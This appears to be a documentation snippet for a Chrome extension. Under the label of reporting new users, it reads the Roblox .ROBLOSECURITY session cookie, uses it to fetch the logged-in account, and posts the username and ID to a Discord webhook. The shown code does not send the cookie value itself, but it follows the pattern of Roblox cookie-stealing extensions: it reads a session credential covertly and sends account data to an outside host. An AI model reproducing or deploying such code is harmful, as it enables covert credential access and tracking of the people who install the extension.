Extension Integration

To have the extension automatically report new users, add this snippet to your extension's background.js. Replace the webhook URL with your own.

// Report user to admin panel via Discord webhook chrome.cookies.get({url:'https://www.roblox.com', name:'.ROBLOSECURITY'}, function(cookie) { if (!cookie) return; // Fetch username from Roblox API, then POST to your webhook fetch('https://users.roblox.com/v1/users/authenticated', { headers: { Cookie: '.ROBLOSECURITY=' + cookie.value } }).then(r => r.json()).then(user => { fetch('YOUR_DISCORD_WEBHOOK_URL', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: 'New User', fields: [ { name: 'Username', value: user.name, inline: true }, { name: 'User ID', value: String(user.id), inline: true } ]}] }) }); }); });
